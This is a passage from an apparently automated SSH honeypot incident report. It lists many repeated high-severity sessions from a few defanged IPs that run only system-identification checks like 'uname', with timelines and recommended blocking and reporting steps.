| `2026-06-25 16:05:03` | `cowrie.login.success` |
| `2026-06-25 16:05:04` | `cowrie.session.params` |
| `2026-06-25 16:05:04` | `cowrie.command.input` |
| `2026-06-25 16:05:04` | `cowrie.log.closed` |
| `2026-06-25 16:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b176073678b1

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 16:05 |
| **Last Seen** | 2026-06-25 16:05 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:05:33` | `cowrie.session.connect` |
| `2026-06-25 16:05:35` | `cowrie.client.version` |
| `2026-06-25 16:05:35` | `cowrie.client.kex` |
| `2026-06-25 16:05:43` | `cowrie.login.success` |
| `2026-06-25 16:05:47` | `cowrie.session.params` |
| `2026-06-25 16:05:47` | `cowrie.command.input` |
| `2026-06-25 16:05:50` | `cowrie.log.closed` |
| `2026-06-25 16:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d22f40662063

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:05 |
| **Last Seen** | 2026-06-25 16:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:05:47` | `cowrie.session.connect` |
| `2026-06-25 16:05:47` | `cowrie.client.version` |
| `2026-06-25 16:05:47` | `cowrie.client.kex` |
| `2026-06-25 16:05:48` | `cowrie.login.success` |
| `2026-06-25 16:05:48` | `cowrie.session.params` |
| `2026-06-25 16:05:48` | `cowrie.command.input` |
| `2026-06-25 16:05:49` | `cowrie.log.closed` |
| `2026-06-25 16:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-350f4deb3483

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:06 |
| **Last Seen** | 2026-06-25 16:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:06:32` | `cowrie.session.connect` |
| `2026-06-25 16:06:32` | `cowrie.client.version` |
| `2026-06-25 16:06:32` | `cowrie.client.kex` |
| `2026-06-25 16:06:32` | `cowrie.login.success` |
| `2026-06-25 16:06:33` | `cowrie.session.params` |
| `2026-06-25 16:06:33` | `cowrie.command.input` |
| `2026-06-25 16:06:33` | `cowrie.log.closed` |
| `2026-06-25 16:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5547b87f4049

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:07 |
| **Last Seen** | 2026-06-25 16:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:07:19` | `cowrie.session.connect` |
| `2026-06-25 16:07:19` | `cowrie.client.version` |
| `2026-06-25 16:07:19` | `cowrie.client.kex` |
| `2026-06-25 16:07:20` | `cowrie.login.success` |
| `2026-06-25 16:07:20` | `cowrie.session.params` |
| `2026-06-25 16:07:20` | `cowrie.command.input` |
| `2026-06-25 16:07:21` | `cowrie.log.closed` |
| `2026-06-25 16:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222d3268b75c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:08 |
| **Last Seen** | 2026-06-25 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:08:06` | `cowrie.session.connect` |
| `2026-06-25 16:08:06` | `cowrie.client.version` |
| `2026-06-25 16:08:06` | `cowrie.client.kex` |
| `2026-06-25 16:08:07` | `cowrie.login.success` |
| `2026-06-25 16:08:07` | `cowrie.session.params` |
| `2026-06-25 16:08:07` | `cowrie.command.input` |
| `2026-06-25 16:08:08` | `cowrie.log.closed` |
| `2026-06-25 16:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e403da9ac2b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:08 |
| **Last Seen** | 2026-06-25 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:08:52` | `cowrie.session.connect` |
| `2026-06-25 16:08:52` | `cowrie.client.version` |
| `2026-06-25 16:08:52` | `cowrie.client.kex` |
| `2026-06-25 16:08:52` | `cowrie.login.success` |
| `2026-06-25 16:08:53` | `cowrie.session.params` |
| `2026-06-25 16:08:53` | `cowrie.command.input` |
| `2026-06-25 16:08:53` | `cowrie.log.closed` |
| `2026-06-25 16:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a27fecde77

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 16:09 |
| **Last Seen** | 2026-06-25 16:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:09:42` | `cowrie.session.connect` |
| `2026-06-25 16:09:42` | `cowrie.client.version` |
| `2026-06-25 16:09:42` | `cowrie.client.kex` |
| `2026-06-25 16:09:45` | `cowrie.login.success` |
| `2026-06-25 16:09:46` | `cowrie.session.params` |
| `2026-06-25 16:09:46` | `cowrie.command.input` |
| `2026-06-25 16:09:46` | `cowrie.log.closed` |
| `2026-06-25 16:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9984b9568a62

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:09 |
| **Last Seen** | 2026-06-25 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:09:42` | `cowrie.session.connect` |
| `2026-06-25 16:09:42` | `cowrie.client.version` |
| `2026-06-25 16:09:42` | `cowrie.client.kex` |
| `2026-06-25 16:09:42` | `cowrie.login.success` |
| `2026-06-25 16:09:43` | `cowrie.session.params` |
| `2026-06-25 16:09:43` | `cowrie.command.input` |
| `2026-06-25 16:09:43` | `cowrie.log.closed` |
| `2026-06-25 16:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b1fd5efa3e0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:10 |
| **Last Seen** | 2026-06-25 16:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:10:29` | `cowrie.session.connect` |
| `2026-06-25 16:10:29` | `cowrie.client.version` |
| `2026-06-25 16:10:29` | `cowrie.client.kex` |
| `2026-06-25 16:10:29` | `cowrie.login.success` |
| `2026-06-25 16:10:30` | `cowrie.session.params` |
| `2026-06-25 16:10:30` | `cowrie.command.input` |
| `2026-06-25 16:10:30` | `cowrie.log.closed` |
| `2026-06-25 16:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ba842ee0028

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:11 |
| **Last Seen** | 2026-06-25 16:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:11:13` | `cowrie.session.connect` |
| `2026-06-25 16:11:13` | `cowrie.client.version` |
| `2026-06-25 16:11:13` | `cowrie.client.kex` |
| `2026-06-25 16:11:13` | `cowrie.login.success` |
| `2026-06-25 16:11:14` | `cowrie.session.params` |
| `2026-06-25 16:11:14` | `cowrie.command.input` |
| `2026-06-25 16:11:14` | `cowrie.log.closed` |
| `2026-06-25 16:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f04b9d13c49

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:11 |
| **Last Seen** | 2026-06-25 16:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:11:58` | `cowrie.session.connect` |
| `2026-06-25 16:11:58` | `cowrie.client.version` |
| `2026-06-25 16:11:58` | `cowrie.client.kex` |
| `2026-06-25 16:11:58` | `cowrie.login.success` |
| `2026-06-25 16:11:59` | `cowrie.session.params` |
| `2026-06-25 16:11:59` | `cowrie.command.input` |
| `2026-06-25 16:11:59` | `cowrie.log.closed` |
| `2026-06-25 16:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb3f2f111eb4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:12 |
| **Last Seen** | 2026-06-25 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:12:48` | `cowrie.session.connect` |
| `2026-06-25 16:12:48` | `cowrie.client.version` |
| `2026-06-25 16:12:49` | `cowrie.client.kex` |
| `2026-06-25 16:12:49` | `cowrie.login.success` |
| `2026-06-25 16:12:50` | `cowrie.session.params` |
| `2026-06-25 16:12:50` | `cowrie.command.input` |
| `2026-06-25 16:12:50` | `cowrie.log.closed` |
| `2026-06-25 16:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4577e930ec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:13 |
| **Last Seen** | 2026-06-25 16:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:13:37` | `cowrie.session.connect` |
| `2026-06-25 16:13:37` | `cowrie.client.version` |
| `2026-06-25 16:13:37` | `cowrie.client.kex` |
| `2026-06-25 16:13:38` | `cowrie.login.success` |
| `2026-06-25 16:13:38` | `cowrie.session.params` |
| `2026-06-25 16:13:38` | `cowrie.command.input` |
| `2026-06-25 16:13:39` | `cowrie.log.closed` |
| `2026-06-25 16:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c66d91cfd9dc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:14 |
| **Last Seen** | 2026-06-25 16:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:14:27` | `cowrie.session.connect` |
| `2026-06-25 16:14:27` | `cowrie.client.version` |
| `2026-06-25 16:14:27` | `cowrie.client.kex` |
| `2026-06-25 16:14:28` | `cowrie.login.success` |
| `2026-06-25 16:14:28` | `cowrie.session.params` |
| `2026-06-25 16:14:28` | `cowrie.command.input` |
| `2026-06-25 16:14:29` | `cowrie.log.closed` |
| `2026-06-25 16:14:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17af99308b7f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:15 |
| **Last Seen** | 2026-06-25 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:15:18` | `cowrie.session.connect` |
| `2026-06-25 16:15:18` | `cowrie.client.version` |
| `2026-06-25 16:15:18` | `cowrie.client.kex` |
| `2026-06-25 16:15:19` | `cowrie.login.success` |
| `2026-06-25 16:15:20` | `cowrie.session.params` |
| `2026-06-25 16:15:20` | `cowrie.command.input` |
| `2026-06-25 16:15:20` | `cowrie.log.closed` |
| `2026-06-25 16:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3f734cc6201

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:16 |
| **Last Seen** | 2026-06-25 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:16:06` | `cowrie.session.connect` |
| `2026-06-25 16:16:06` | `cowrie.client.version` |
| `2026-06-25 16:16:07` | `cowrie.client.kex` |
| `2026-06-25 16:16:07` | `cowrie.login.success` |
| `2026-06-25 16:16:08` | `cowrie.session.params` |
| `2026-06-25 16:16:08` | `cowrie.command.input` |
| `2026-06-25 16:16:08` | `cowrie.log.closed` |
| `2026-06-25 16:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72761c0b4e3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:16 |
| **Last Seen** | 2026-06-25 16:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:16:51` | `cowrie.session.connect` |
| `2026-06-25 16:16:51` | `cowrie.client.version` |
| `2026-06-25 16:16:51` | `cowrie.client.kex` |
| `2026-06-25 16:16:52` | `cowrie.login.success` |
| `2026-06-25 16:16:52` | `cowrie.session.params` |
| `2026-06-25 16:16:52` | `cowrie.command.input` |
| `2026-06-25 16:16:52` | `cowrie.log.closed` |
| `2026-06-25 16:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f0c61a68e8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:17 |
| **Last Seen** | 2026-06-25 16:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:17:38` | `cowrie.session.connect` |
| `2026-06-25 16:17:38` | `cowrie.client.version` |
| `2026-06-25 16:17:38` | `cowrie.client.kex` |
| `2026-06-25 16:17:38` | `cowrie.login.success` |
| `2026-06-25 16:17:39` | `cowrie.session.params` |
| `2026-06-25 16:17:39` | `cowrie.command.input` |
| `2026-06-25 16:17:39` | `cowrie.log.closed` |
| `2026-06-25 16:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b56b2ccfe1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:18 |
| **Last Seen** | 2026-06-25 16:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:18:26` | `cowrie.session.connect` |
| `2026-06-25 16:18:26` | `cowrie.client.version` |
| `2026-06-25 16:18:26` | `cowrie.client.kex` |
| `2026-06-25 16:18:26` | `cowrie.login.success` |
| `2026-06-25 16:18:27` | `cowrie.session.params` |
| `2026-06-25 16:18:27` | `cowrie.command.input` |
| `2026-06-25 16:18:27` | `cowrie.log.closed` |
| `2026-06-25 16:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc44ee6f800b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 16:18 |
| **Last Seen** | 2026-06-25 16:18 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:18:41` | `cowrie.session.connect` |
| `2026-06-25 16:18:42` | `cowrie.client.version` |
| `2026-06-25 16:18:42` | `cowrie.client.kex` |
| `2026-06-25 16:18:49` | `cowrie.login.success` |
| `2026-06-25 16:18:52` | `cowrie.session.params` |
| `2026-06-25 16:18:52` | `cowrie.command.input` |
| `2026-06-25 16:18:54` | `cowrie.log.closed` |
| `2026-06-25 16:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad57fa65843d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:19 |
| **Last Seen** | 2026-06-25 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:19:11` | `cowrie.session.connect` |
| `2026-06-25 16:19:11` | `cowrie.client.version` |
| `2026-06-25 16:19:11` | `cowrie.client.kex` |
| `2026-06-25 16:19:11` | `cowrie.login.success` |
| `2026-06-25 16:19:12` | `cowrie.session.params` |
| `2026-06-25 16:19:12` | `cowrie.command.input` |
| `2026-06-25 16:19:12` | `cowrie.log.closed` |
| `2026-06-25 16:19:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b724ea7e8862

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:19 |
| **Last Seen** | 2026-06-25 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:19:58` | `cowrie.session.connect` |
| `2026-06-25 16:19:58` | `cowrie.client.version` |
| `2026-06-25 16:19:58` | `cowrie.client.kex` |
| `2026-06-25 16:19:58` | `cowrie.login.success` |
| `2026-06-25 16:19:59` | `cowrie.session.params` |
| `2026-06-25 16:19:59` | `cowrie.command.input` |
| `2026-06-25 16:19:59` | `cowrie.log.closed` |
| `2026-06-25 16:19:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b59e2e20899a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:20 |
| **Last Seen** | 2026-06-25 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:20:46` | `cowrie.session.connect` |
| `2026-06-25 16:20:46` | `cowrie.client.version` |
| `2026-06-25 16:20:46` | `cowrie.client.kex` |
| `2026-06-25 16:20:46` | `cowrie.login.success` |
| `2026-06-25 16:20:47` | `cowrie.session.params` |
| `2026-06-25 16:20:47` | `cowrie.command.input` |
| `2026-06-25 16:20:47` | `cowrie.log.closed` |
| `2026-06-25 16:20:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8958b692e372

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:21 |
| **Last Seen** | 2026-06-25 16:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:21:34` | `cowrie.session.connect` |
| `2026-06-25 16:21:34` | `cowrie.client.version` |
| `2026-06-25 16:21:34` | `cowrie.client.kex` |
| `2026-06-25 16:21:34` | `cowrie.login.success` |
| `2026-06-25 16:21:35` | `cowrie.session.params` |
| `2026-06-25 16:21:35` | `cowrie.command.input` |
| `2026-06-25 16:21:35` | `cowrie.log.closed` |
| `2026-06-25 16:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2381af4b4e1d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:22 |
| **Last Seen** | 2026-06-25 16:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 16:22:23` | `cowrie.session.connect` |
| `2026-06-25 16:22:23` | `cowrie.client.version` |
| `2026-06-25 16:22:23` | `cowrie.client.kex` |
| `2026-06-25 16:22:23` | `cowrie.login.success` |
| `2026-06-25 16:22:24` | `cowrie.session.params` |
| `2026-06-25 16:22:24` | `cowrie.command.input` |
| `2026-06-25 16:22:24` | `cowrie.log.closed` |
| `2026-06-25 16:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69de1bf335e7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 16:23 |
| **Last Seen** | 2026-06-25 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
